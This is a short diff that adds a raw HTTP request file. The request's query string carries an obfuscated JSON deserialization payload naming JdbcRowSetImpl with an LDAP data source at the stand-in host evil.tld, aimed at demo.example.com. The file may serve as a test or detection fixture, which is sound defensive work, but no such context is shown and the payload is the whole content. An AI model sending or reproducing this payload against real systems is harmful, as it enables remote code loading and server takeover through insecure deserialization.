@@ -1,0 +1,4 @@
+GET /a?q={%26%23x22;@type%26%23x22;:%26%23x22;com.sun.rowset.JdbcRowSetImpl%26%23x22;,%26%23x22;dataSourceName%26%23x22;:%26%23x22;ldap://evil.tld/x%26%23x22;,%26%23x22;autoCommit%26%23x22;:true} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
